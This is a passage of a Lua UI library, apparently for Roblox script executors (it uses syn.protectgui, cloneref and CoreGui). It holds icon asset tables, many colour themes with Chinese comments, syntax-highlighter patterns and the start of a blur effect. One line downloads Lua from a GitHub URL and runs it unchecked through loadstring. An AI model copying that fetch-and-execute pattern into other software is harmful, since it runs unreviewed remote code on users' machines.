	["lucide-shovel"] = "rbxassetid://10734952773",
	["lucide-shower-head"] = "rbxassetid://10734952942",
	["lucide-shrink"] = "rbxassetid://10734953073",
	["lucide-shrub"] = "rbxassetid://10734953241",
	["lucide-shuffle"] = "rbxassetid://10734953451",
	["lucide-sidebar"] = "rbxassetid://10734954301",
	["lucide-sidebar-close"] = "rbxassetid://10734953715",
	["lucide-sidebar-open"] = "rbxassetid://10734954000",
	["lucide-sigma"] = "rbxassetid://10734954538",
	["lucide-signal"] = "rbxassetid://10734961133",
	["lucide-signal-high"] = "rbxassetid://10734954807",
	["lucide-signal-low"] = "rbxassetid://10734955080",
	["lucide-signal-medium"] = "rbxassetid://10734955336",
	["lucide-signal-zero"] = "rbxassetid://10734960878",
	["lucide-siren"] = "rbxassetid://10734961284",
	["lucide-skip-back"] = "rbxassetid://10734961526",
	["lucide-skip-forward"] = "rbxassetid://10734961809",
	["lucide-skull"] = "rbxassetid://10734962068",
	["lucide-slack"] = "rbxassetid://10734962339",
	["lucide-slash"] = "rbxassetid://10734962600",
	["lucide-slice"] = "rbxassetid://10734963024",
	["lucide-sliders"] = "rbxassetid://10734963400",
	["lucide-sliders-horizontal"] = "rbxassetid://10734963191",
	["lucide-smartphone"] = "rbxassetid://10734963940",
	["lucide-smartphone-charging"] = "rbxassetid://10734963671",
	["lucide-smile"] = "rbxassetid://10734964441",
	["lucide-smile-plus"] = "rbxassetid://10734964188",
	["lucide-snowflake"] = "rbxassetid://10734964600",
	["lucide-sofa"] = "rbxassetid://10734964852",
	["lucide-sort-asc"] = "rbxassetid://10734965115",
	["lucide-sort-desc"] = "rbxassetid://10734965287",
	["lucide-speaker"] = "rbxassetid://10734965419",
	["lucide-sprout"] = "rbxassetid://10734965572",
	["lucide-square"] = "rbxassetid://10734965702",
	["lucide-star"] = "rbxassetid://10734966248",
	["lucide-star-half"] = "rbxassetid://10734965897",
	["lucide-star-off"] = "rbxassetid://10734966097",
	["lucide-stethoscope"] = "rbxassetid://10734966384",
	["lucide-sticker"] = "rbxassetid://10734972234",
	["lucide-sticky-note"] = "rbxassetid://10734972463",
	["lucide-stop-circle"] = "rbxassetid://10734972621",
	["lucide-stretch-horizontal"] = "rbxassetid://10734972862",
	["lucide-stretch-vertical"] = "rbxassetid://10734973130",
	["lucide-strikethrough"] = "rbxassetid://10734973290",
	["lucide-subscript"] = "rbxassetid://10734973457",
	["lucide-sun"] = "rbxassetid://10734974297",
	["lucide-sun-dim"] = "rbxassetid://10734973645",
	["lucide-sun-medium"] = "rbxassetid://10734973778",
	["lucide-sun-moon"] = "rbxassetid://10734973999",
	["lucide-sun-snow"] = "rbxassetid://10734974130",
	["lucide-sunrise"] = "rbxassetid://10734974522",
	["lucide-sunset"] = "rbxassetid://10734974689",
	["lucide-superscript"] = "rbxassetid://10734974850",
	["lucide-swiss-franc"] = "rbxassetid://10734975024",
	["lucide-switch-camera"] = "rbxassetid://10734975214",
	["lucide-sword"] = "rbxassetid://10734975486",
	["lucide-swords"] = "rbxassetid://10734975692",
	["lucide-syringe"] = "rbxassetid://10734975932",
	["lucide-table"] = "rbxassetid://10734976230",
	["lucide-table-2"] = "rbxassetid://10734976097",
	["lucide-tablet"] = "rbxassetid://10734976394",
	["lucide-tag"] = "rbxassetid://10734976528",
	["lucide-tags"] = "rbxassetid://10734976739",
	["lucide-target"] = "rbxassetid://10734977012",
	["lucide-tent"] = "rbxassetid://10734981750",
	["lucide-terminal"] = "rbxassetid://10734982144",
	["lucide-terminal-square"] = "rbxassetid://10734981995",
	["lucide-text-cursor"] = "rbxassetid://10734982395",
	["lucide-text-cursor-input"] = "rbxassetid://10734982297",
	["lucide-thermometer"] = "rbxassetid://10734983134",
	["lucide-thermometer-snowflake"] = "rbxassetid://10734982571",
	["lucide-thermometer-sun"] = "rbxassetid://10734982771",
	["lucide-thumbs-down"] = "rbxassetid://10734983359",
	["lucide-thumbs-up"] = "rbxassetid://10734983629",
	["lucide-ticket"] = "rbxassetid://10734983868",
	["lucide-timer"] = "rbxassetid://10734984606",
	["lucide-timer-off"] = "rbxassetid://10734984138",
	["lucide-timer-reset"] = "rbxassetid://10734984355",
	["lucide-toggle-left"] = "rbxassetid://10734984834",
	["lucide-toggle-right"] = "rbxassetid://10734985040",
	["lucide-tornado"] = "rbxassetid://10734985247",
	["lucide-toy-brick"] = "rbxassetid://10747361919",
	["lucide-train"] = "rbxassetid://10747362105",
	["lucide-trash"] = "rbxassetid://10747362393",
	["lucide-trash-2"] = "rbxassetid://10747362241",
	["lucide-tree-deciduous"] = "rbxassetid://10747362534",
	["lucide-tree-pine"] = "rbxassetid://10747362748",
	["lucide-trees"] = "rbxassetid://10747363016",
	["lucide-trending-down"] = "rbxassetid://10747363205",
	["lucide-trending-up"] = "rbxassetid://10747363465",
	["lucide-triangle"] = "rbxassetid://10747363621",
	["lucide-trophy"] = "rbxassetid://10747363809",
	["lucide-truck"] = "rbxassetid://10747364031",
	["lucide-tv"] = "rbxassetid://10747364593",
	["lucide-tv-2"] = "rbxassetid://10747364302",
	["lucide-type"] = "rbxassetid://10747364761",
	["lucide-umbrella"] = "rbxassetid://10747364971",
	["lucide-underline"] = "rbxassetid://10747365191",
	["lucide-undo"] = "rbxassetid://10747365484",
	["lucide-undo-2"] = "rbxassetid://10747365359",
	["lucide-unlink"] = "rbxassetid://10747365771",
	["lucide-unlink-2"] = "rbxassetid://10747397871",
	["lucide-unlock"] = "rbxassetid://10747366027",
	["lucide-upload"] = "rbxassetid://10747366434",
	["lucide-upload-cloud"] = "rbxassetid://10747366266",
	["lucide-usb"] = "rbxassetid://10747366606",
	["lucide-user"] = "rbxassetid://10747373176",
	["lucide-user-check"] = "rbxassetid://10747371901",
	["lucide-user-cog"] = "rbxassetid://10747372167",
	["lucide-user-minus"] = "rbxassetid://10747372346",
	["lucide-user-plus"] = "rbxassetid://10747372702",
	["lucide-user-x"] = "rbxassetid://10747372992",
	["lucide-users"] = "rbxassetid://10747373426",
	["lucide-utensils"] = "rbxassetid://10747373821",
	["lucide-utensils-crossed"] = "rbxassetid://10747373629",
	["lucide-venetian-mask"] = "rbxassetid://10747374003",
	["lucide-verified"] = "rbxassetid://10747374131",
	["lucide-vibrate"] = "rbxassetid://10747374489",
	["lucide-vibrate-off"] = "rbxassetid://10747374269",
	["lucide-video"] = "rbxassetid://10747374938",
	["lucide-video-off"] = "rbxassetid://10747374721",
	["lucide-view"] = "rbxassetid://10747375132",
	["lucide-voicemail"] = "rbxassetid://10747375281",
	["lucide-volume"] = "rbxassetid://10747376008",
	["lucide-volume-1"] = "rbxassetid://10747375450",
	["lucide-volume-2"] = "rbxassetid://10747375679",
	["lucide-volume-x"] = "rbxassetid://10747375880",
	["lucide-wallet"] = "rbxassetid://10747376205",
	["lucide-wand"] = "rbxassetid://10747376565",
	["lucide-wand-2"] = "rbxassetid://10747376349",
	["lucide-watch"] = "rbxassetid://10747376722",
	["lucide-waves"] = "rbxassetid://10747376931",
	["lucide-webcam"] = "rbxassetid://10747381992",
	["lucide-wifi"] = "rbxassetid://10747382504",
	["lucide-wifi-off"] = "rbxassetid://10747382268",
	["lucide-wind"] = "rbxassetid://10747382750",
	["lucide-wrap-text"] = "rbxassetid://10747383065",
	["lucide-wrench"] = "rbxassetid://10747383470",
	["lucide-x"] = "rbxassetid://10747384394",
	["lucide-x-circle"] = "rbxassetid://10747383819",
	["lucide-x-octagon"] = "rbxassetid://10747384037",
	["lucide-x-square"] = "rbxassetid://10747384217",
	["lucide-zoom-in"] = "rbxassetid://10747384552",
	["lucide-zoom-out"] = "rbxassetid://10747384679",
}

local TextService = game:GetService('TextService');

Library.ProtectGui = protectgui or protect_gui or (syn and syn.protectgui) or function() end;
Library.Cloneref = cloneref or function(o) return o end;
Library.TweenService = game:GetService('TweenService');
Library.LocalPlayer = game:GetService('Players').LocalPlayer;
Library.CoreGui = (game:FindFirstChild('CoreGui') and Library.Cloneref(game:GetService('CoreGui'))) or Library.LocalPlayer.PlayerGui;
------------------------------------UI.主题颜色------------------------------------------------------------------------------------------------------------
Library.SizeLibrary = {
	Default = UDim2.fromOffset(580, 385),
	Auth = UDim2.new(0.05, 250,0.05, 125),
	Max = UDim2.fromScale(1,1),
	Loading = UDim2.new(0, 90,0, 90),
	Close = UDim2.new(0.01, 25,0.01, 25)
};

Library.Theme = {}

Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 255, 255),
	    Default = Color3.fromRGB(32, 33, 36),
	    Disable = Color3.fromRGB(167, 173, 188),
	    TextColor = Color3.fromRGB(220, 224, 234),
    }
    function Library.Theme:Default()
	Library.Colors = { 
       Hightlight = Color3.fromRGB(0, 255, 255),
	   Default = Color3.fromRGB(32, 33, 36),
	   Disable = Color3.fromRGB(167, 173, 188),
	   TextColor = Color3.fromRGB(220, 224, 234),
	}
                   end;
    function Library.Theme:Dark()
	Library.Colors = { 
       Hightlight = Color3.fromRGB(255, 255, 255),
	   Default = Color3.fromRGB(20, 20, 22),
	   Disable = Color3.fromRGB(167, 173, 188),
	   TextColor = Color3.fromRGB(220, 224, 234),
    }
                  end;
    function Library.Theme:Discord()
	Library.Colors = { 
        Hightlight = Color3.fromRGB(114,137,218),
		Default = Color3.fromRGB(35, 37, 40),
		Disable = Color3.fromRGB(167, 173, 188),
		TextColor = Color3.fromRGB(234, 234, 234),
	}
                  end;
    function Library.Theme:Discord1()
	Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 115, 255),
		Default = Color3.fromRGB(198, 211, 229),
		Disable = Color3.fromRGB(74, 77, 83),
		TextColor = Color3.fromRGB(0, 0, 0),
	}
                  end;
    function Library.Theme:Catppuccin()
	Library.Colors = { 
        Hightlight = Color3.fromRGB(201,165,245),
		Default = Color3.fromRGB(30,31,47),
		Disable = Color3.fromRGB(109,123,154,255),
		TextColor = Color3.fromRGB(204, 204, 204),
	}
                  end;
    function Library.Theme:Discord2()
	Library.Colors = { 
        Hightlight = Color3.fromRGB(90,212,176),
		Default = Color3.fromRGB(22,25,29),
		Disable = Color3.fromRGB(72,72,83),
		TextColor = Color3.fromRGB(191,193,195),
	}
                  end;
    function Library.Theme:Matcha()
	Library.Colors = { 
        Hightlight = Color3.fromRGB(152,132,110),
		Default = Color3.fromRGB(38,49,55),
		Disable = Color3.fromRGB(62,83,82),
		TextColor = Color3.fromRGB(165,178,175),
	}
                  end;
    function Library.Theme:Neverlose()
	Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 251, 255),
		Default = Color3.fromRGB(0, 13, 26),
		Disable = Color3.fromRGB(167, 173, 188),
		TextColor = Color3.fromRGB(255, 255, 255),
	}
                  end;
    function Library.Theme:Custom(Hightlight,Default,Disable,TextColor)
	Library.Colors = { 
        Hightlight = Hightlight,
		Default = Default,
		Disable = Disable,
		TextColor = TextColor,
	}
                  end;
    function Library.Theme:HightGreen()
	Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 255, 140),
		Default = Color3.fromRGB(8, 13, 12),
		Disable = Color3.fromRGB(163, 188, 165),
		TextColor = Color3.fromRGB(255, 255, 255),
	}
                  end;
    function Library.Theme:Halloween()
	Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 162, 0),
		Default = Color3.fromRGB(13, 11, 10),
		Disable = Color3.fromRGB(188, 156, 156),
		TextColor = Color3.fromRGB(255, 0, 0),
	}
                  end;
    function Library.Theme:Christmas()
	Library.Colors = { 
        Hightlight = Color3.fromRGB(138, 220, 255),
		Default = Color3.fromRGB(11, 13, 13),
		Disable = Color3.fromRGB(81, 103, 104),
		TextColor = Color3.fromRGB(249, 249, 249),
	}
                  end;
    function Library.Theme:Valentine()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 0, 128), -- 粉红色
        Default = Color3.fromRGB(200, 15, 100), -- 深粉红色
        Disable = Color3.fromRGB(206, 162, 168), -- 浅灰色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Summer()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 255, 127), -- 酸橙色
        Default = Color3.fromRGB(0, 128, 102), -- 深绿色
        Disable = Color3.fromRGB(173, 216, 230), -- 天蓝色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Autumn()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 140, 0), -- 橙色
        Default = Color3.fromRGB(139, 69, 19), -- 深棕色
        Disable = Color3.fromRGB(188, 143, 143), -- 浅棕色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Winter()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(173, 216, 230), -- 天蓝色
        Default = Color3.fromRGB(70, 130, 180), -- 深蓝色
        Disable = Color3.fromRGB(199, 219, 249), -- 浅蓝色
        TextColor = Color3.fromRGB(0, 0, 0), -- 黑色
    }
                  end;
    function Library.Theme:Ocean()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 150, 136), -- 青绿色
        Default = Color3.fromRGB(0, 51, 51), -- 深蓝色
        Disable = Color3.fromRGB(102, 153, 255), -- 亮蓝色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Nord()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(136, 192, 208), -- 北欧蓝
        Default = Color3.fromRGB(46, 52, 64), -- 北欧深灰
        Disable = Color3.fromRGB(88, 110, 117), -- 北欧浅灰
        TextColor = Color3.fromRGB(216, 222, 227), -- 北欧亮灰
    }
                  end;
    function Library.Theme:Mint()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(189, 252, 201), -- 薄荷绿
        Default = Color3.fromRGB(39, 174, 96), -- 深薄荷绿
        Disable = Color3.fromRGB(189, 220, 189), -- 浅薄荷绿
        TextColor = Color3.fromRGB(41, 128, 185), -- 薄荷蓝
    }
                  end;
    function Library.Theme:Sunset()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 69, 0), -- 夕阳橙
        Default = Color3.fromRGB(139, 69, 19), -- 深棕色
        Disable = Color3.fromRGB(207, 207, 207), -- 浅灰色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Rose()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 105, 180), -- 玫瑰粉
        Default = Color3.fromRGB(96, 0, 77), -- 深玫瑰红
        Disable = Color3.fromRGB(204, 192, 179), -- 玫瑰棕
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Cyberpunk()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 252, 255), -- 霓虹青
        Default = Color3.fromRGB(0, 0, 0), -- 黑色
        Disable = Color3.fromRGB(75, 75, 75), -- 深灰色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Lavender()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(230, 230, 250), -- 淡紫色
        Default = Color3.fromRGB(150, 150, 170), -- 深紫色
        Disable = Color3.fromRGB(200, 200, 220), -- 浅紫色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:AquaMarine()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(127, 255, 212), -- 水绿色
        Default = Color3.fromRGB(0, 100, 100), -- 深水绿
        Disable = Color3.fromRGB(143, 188, 143), -- 浅水绿
        TextColor = Color3.fromRGB(0, 0, 0), -- 黑色
    }
                  end;
    function Library.Theme:Midnight()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(58, 69, 77), -- 午夜蓝
        Default = Color3.fromRGB(10, 10, 10), -- 深午夜黑
        Disable = Color3.fromRGB(58, 69, 77), -- 浅午夜灰
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Sakura()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 182, 193), -- 樱花粉
        Default = Color3.fromRGB(160, 82, 45), -- 深棕色
        Disable = Color3.fromRGB(233, 185, 170), -- 浅棕色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Desert()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 223, 129), -- 沙漠金
        Default = Color3.fromRGB(139, 69, 19), -- 沙漠棕
        Disable = Color3.fromRGB(210, 180, 140), -- 浅沙漠棕
        TextColor = Color3.fromRGB(0, 0, 0), -- 黑色
    }
                  end;
    function Library.Theme:Forest()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(34, 139, 34), -- 森林绿
        Default = Color3.fromRGB(0, 100, 0), -- 深森林绿
        Disable = Color3.fromRGB(144, 238, 144), -- 浅森林绿
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Royal()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(102, 51, 153), -- 皇家紫
        Default = Color3.fromRGB(0, 0, 0), -- 黑色
        Disable = Color3.fromRGB(173, 127, 168), -- 浅紫色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Ruby()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(224, 17, 95), -- 红宝石红
        Default = Color3.fromRGB(139, 0, 0), -- 深红色
        Disable = Color3.fromRGB(233, 185, 170), -- 浅红色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Tropical()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 239, 213), -- 热带黄
        Default = Color3.fromRGB(0, 95, 87), -- 热带绿
        Disable = Color3.fromRGB(218, 232, 218), -- 热带浅绿
        TextColor = Color3.fromRGB(10, 10, 10), -- 深灰色
    }
                  end;
    function Library.Theme:Vintage()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(139, 69, 19), -- 复古棕
        Default = Color3.fromRGB(112, 128, 144), -- 复古灰
        Disable = Color3.fromRGB(191, 191, 191), -- 复古浅灰
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Cobalt()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 255, 255), -- 钴蓝色
        Default = Color3.fromRGB(0, 0, 102), -- 深钴蓝
        Disable = Color3.fromRGB(102, 153, 204), -- 浅钴蓝
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Sage()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(158, 251, 155), -- 鼠尾草绿
        Default = Color3.fromRGB(75, 100, 70), -- 深鼠尾草绿
        Disable = Color3.fromRGB(188, 226, 184), -- 浅鼠尾草绿
        TextColor = Color3.fromRGB(0, 0, 0), -- 黑色
    }
                  end;
    function Library.Theme:Bronze()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(205, 127, 50), -- 青铜色
        Default = Color3.fromRGB(139, 69, 19), -- 深青铜色
        Disable = Color3.fromRGB(222, 184, 135), -- 浅青铜色
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Lagoon()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 150, 136), -- 泻湖绿
        Default = Color3.fromRGB(0, 51, 51), -- 深海绿
        Disable = Color3.fromRGB(102, 153, 255), -- 浅泻湖绿
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Amber()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 191, 0), -- 琥珀色
        Default = Color3.fromRGB(139, 69, 19), -- 深琥珀色
        Disable = Color3.fromRGB(255, 204, 102), -- 浅琥珀色
        TextColor = Color3.fromRGB(0, 0, 0), -- 黑色
    }
                  end;
    function Library.Theme:Aurora()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(138, 43, 226), -- 极光紫
        Default = Color3.fromRGB(26, 26, 26), -- 深空黑
        Disable = Color3.fromRGB(72, 72, 72), -- 星云灰
        TextColor = Color3.fromRGB(255, 255, 255), -- 星光白
    }
                  end;
    function Library.Theme:Neon()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 252, 255), -- 霓虹青
        Default = Color3.fromRGB(25, 25, 25), -- 午夜黑
        Disable = Color3.fromRGB(100, 100, 100), -- 深灰
        TextColor = Color3.fromRGB(255, 255, 255), -- 亮白
    }
                  end;
    function Library.Theme:Pastel()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 158, 181), -- 粉彩红
        Default = Color3.fromRGB(207, 207, 207), -- 粉彩灰
        Disable = Color3.fromRGB(238, 238, 238), -- 粉彩浅灰
        TextColor = Color3.fromRGB(51, 51, 51), -- 深灰
    }
                  end;
    function Library.Theme:Jungle()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 128, 0), -- 丛林绿
        Default = Color3.fromRGB(34, 34, 34), -- 暗绿
        Disable = Color3.fromRGB(102, 153, 102), -- 浅绿
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:OceanBreeze()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(0, 173, 239), -- 海洋蓝
        Default = Color3.fromRGB(41, 64, 90), -- 海洋深蓝
        Disable = Color3.fromRGB(131, 175, 155), -- 海洋浅蓝
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Sunrise()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 159, 67), -- 日出色
        Default = Color3.fromRGB(34, 34, 34), -- 深灰
        Disable = Color3.fromRGB(204, 153, 102), -- 日出橙
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:StarryNight()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(70, 130, 180), -- 星空蓝
        Default = Color3.fromRGB(12, 12, 12), -- 深夜黑
        Disable = Color3.fromRGB(53, 53, 53), -- 暗夜灰
        TextColor = Color3.fromRGB(255, 255, 255), -- 星光白
    }
                  end;
    function Library.Theme:Twilight()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(75, 0, 130), -- 暮光紫
        Default = Color3.fromRGB(45, 45, 60), -- 暮光深灰
        Disable = Color3.fromRGB(100, 100, 120), -- 暮光浅灰
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Frost()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(185, 225, 255), -- 霜冻蓝
        Default = Color3.fromRGB(240, 250, 255), -- 霜冻白
        Disable = Color3.fromRGB(200, 215, 230), -- 霜冻浅蓝
        TextColor = Color3.fromRGB(0, 0, 0), -- 黑色
    }
                  end;
    function Library.Theme:Floral()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 182, 193), -- 花园粉
        Default = Color3.fromRGB(135, 206, 235), -- 花园蓝
        Disable = Color3.fromRGB(225, 225, 225), -- 花园灰
        TextColor = Color3.fromRGB(10, 10, 10), -- 深灰色
    }
                  end;
    function Library.Theme:SunsetBeach()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 69, 0), -- 日落橙
        Default = Color3.fromRGB(255, 140, 0), -- 沙滩金
        Disable = Color3.fromRGB(255, 213, 102), -- 沙滩浅金
        TextColor = Color3.fromRGB(0, 0, 0), -- 黑色
    }
                  end;
    function Library.Theme:Mystic()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(65, 105, 225), -- 神秘蓝
        Default = Color3.fromRGB(40, 50, 60), -- 神秘深灰
        Disable = Color3.fromRGB(130, 140, 170), -- 神秘浅灰
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                  end;
    function Library.Theme:Elegant()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 193, 7), -- 优雅金
        Default = Color3.fromRGB(70, 30, 20), -- 优雅深棕
        Disable = Color3.fromRGB(200, 160, 120), -- 优雅浅棕
        TextColor = Color3.fromRGB(255, 255, 255), -- 白色
    }
                   end;
    function Library.Theme:ChineseNewYear()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(255, 0, 0), -- 红色，代表喜庆和好运
        Default = Color3.fromRGB(255, 165, 0), -- 橙色，代表活力和繁荣
        Disable = Color3.fromRGB(255, 215, 205), -- 浅红色，代表温和和吉祥
        TextColor = Color3.fromRGB(0, 0, 0), -- 黑色，用于文本，保持清晰可读
    }
                   end;
    function Library.Theme:Celebration()
    Library.Colors = { 
        Hightlight = Color3.fromRGB(250, 1, 1), -- 喜庆红
        Default = Color3.fromRGB(255, 0, 0), -- 金色
        Disable = Color3.fromRGB(255, 192, 203), -- 浅粉色
        TextColor = Color3.fromRGB(0, 0, 0), -- 黑色
    }
                   end;
    function Library.Theme:RandomColor()
    local randomColor = function()
        return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
    end

    Library.Colors = { 
        Hightlight = randomColor(), -- 随机高亮色
        Default = randomColor(), -- 随机默认色
        Disable = randomColor(), -- 随机禁用色
        TextColor = randomColor() -- 随机文本色
    }
end;
------------------------------------UI.主题颜色------------------------------------------------------------------------------------------------------------
function Library.Theme:Random()
	local RNG = Random.new();

	local Start = function()
		return RNG:NextNumber(0,255) , RNG:NextNumber(0,255) , RNG:NextNumber(0,255);
	end;

	Library.Colors = { 
	    Hightlight = Color3.fromRGB(Start()),
	    Default = Color3.fromRGB(Start()),
		Disable = Color3.fromRGB(Start()),
		TextColor = Color3.fromRGB(Start()),
	};

	print('Random Theme:',Library.Colors)
end;

Library.TweenLibrary = {
	WindowChanged = TweenInfo.new(1,Enum.EasingStyle.Quint,Enum.EasingDirection.InOut),
	Normal = TweenInfo.new(0.5,Enum.EasingStyle.Quint,Enum.EasingDirection.In),
	WindowChangedFast = TweenInfo.new(0.35,Enum.EasingStyle.Quint),
	SmallEffect = TweenInfo.new(0.5,Enum.EasingStyle.Quint),
	FastEffect = TweenInfo.new(0.2,Enum.EasingStyle.Quint),
	BinEffect = TweenInfo.new(0.01),
	UltrsFast = TweenInfo.new(0.0001,Enum.EasingStyle.Linear)
};

local _C,Source = pcall(function() return loadstring(game:HttpGetAsync('https://github.com/GTAFAW/UI/raw/main/UI.BLUR.LUA'))() end);
local operators = {"^(function)[^%w_]", "^(local)[^%w_]", "^(if)[^%w_]", "^(for)[^%w_]", "^(while)[^%w_]", "^(then)[^%w_]", "^(do)[^%w_]", "^(else)[^%w_]", "^(elseif)[^%w_]", "^(return)[^%w_]", "^(end)[^%w_]", "^(continue)[^%w_]", "^(and)[^%w_]", "^(not)[^%w_]", "^(or)[^%w_]", "[^%w_](or)[^%w_]", "[^%w_](and)[^%w_]", "[^%w_](not)[^%w_]", "[^%w_](continue)[^%w_]", "[^%w_](function)[^%w_]", "[^%w_](local)[^%w_]", "[^%w_](if)[^%w_]", "[^%w_](for)[^%w_]", "[^%w_](while)[^%w_]", "[^%w_](then)[^%w_]", "[^%w_](do)[^%w_]", "[^%w_](else)[^%w_]", "[^%w_](elseif)[^%w_]", "[^%w_](return)[^%w_]", "[^%w_](end)[^%w_]"}
local strings = {{"\"", "\""}, {"'", "'"}, {"%[%[", "%]%]", true}}
local comments = {"%-%-%[%[[^%]%]]+%]?%]?", "(%-%-[^\n]+)"}
local functions = {"[^%w_]([%a_][%a%d_]*)%s*%(", "^([%a_][%a%d_]*)%s*%(", "[:%.%(%[%p]([%a_][%a%d_]*)%s*%("}
local numbers = {"[^%w_](%d+[eE]?%d*)", "[^%w_](%.%d+[eE]?%d*)", "[^%w_](%d+%.%d+[eE]?%d*)", "^(%d+[eE]?%d*)", "^(%.%d+[eE]?%d*)", "^(%d+%.%d+[eE]?%d*)"}
local booleans = {"[^%w_](true)", "^(true)", "[^%w_](false)", "^(false)", "[^%w_](nil)", "^(nil)"}
local objects = {"[^%w_:]([%a_][%a%d_]*):", "^([%a_][%a%d_]*):"}
local other = {"[^_%s%w=>~<%-%+%*]", ">", "~", "<", "%-", "%+", "=", "%*"}
local tableContents = {};
local lines = {};
local LoadAcrylic = function()
---------------------------------UI.渐变效果---------------------------------------------------------------------------------------------------------------------------------------
	local GuiSystem = {};

	local Twen = game:GetService('TweenService');
	local RunService = game:GetService('RunService');
	local CurrentCamera = workspace.CurrentCamera;

	function GuiSystem:Hash()
		return string.reverse(string.gsub(game:GetService('HttpService'):GenerateGUID(false),'..',function(aa)
			return string.reverse(aa)
		end))
	end

	local function Hiter(planePos, planeNormal, rayOrigin, rayDirection)
		local n = planeNormal
		local d = rayDirection
		local v = rayOrigin - planePos

		local num = (n.x*v.x) + (n.y*v.y) + (n.z*v.z)
		local den = (n.x*d.x) + (n.y*d.y) + (n.z*d.z)
		local a = -num / den

		return rayOrigin + (a * rayDirection), a;
	end;

	function GuiSystem.new(frame,NoAutoBackground)
		local Part = Instance.new('Part',workspace);
		local DepthOfField = Instance.new('DepthOfFieldEffect',game:GetService('Lighting'));
		local SurfaceGui = Instance.new('SurfaceGui',Part);
		local BlockMesh = Instance.new("BlockMesh");

		BlockMesh.Parent = Part;

		Part.Material = Enum.Material.Glass;
		Part.Transparency = 1;
		Part.Reflectance = 1;
		Part.CastShadow = false;
		Part.Anchored = true;
		Part.CanCollide = false;
		Part.CanQuery = false;
		Part.CollisionGroup = GuiSystem:Hash();
		Part.Size = Vector3.new(1, 1, 1) * 0.01;
		Part.Color = Color3.fromRGB(0,0,0);

		Twen:Create(Part,TweenInfo.new(1,Enum.EasingStyle.Quint,Enum.EasingDirection.In),{
			Transparency = 0.8;
		}):Play()

		DepthOfField.Enabled = true;
		DepthOfField.FarIntensity = 1;
		DepthOfField.FocusDistance = 0;
		DepthOfField.InFocusRadius = 500;
		DepthOfField.NearIntensity = 1;

		SurfaceGui.AlwaysOnTop = true;
		SurfaceGui.Adornee = Part;
		SurfaceGui.Active = true;
		SurfaceGui.Face = Enum.NormalId.Front;
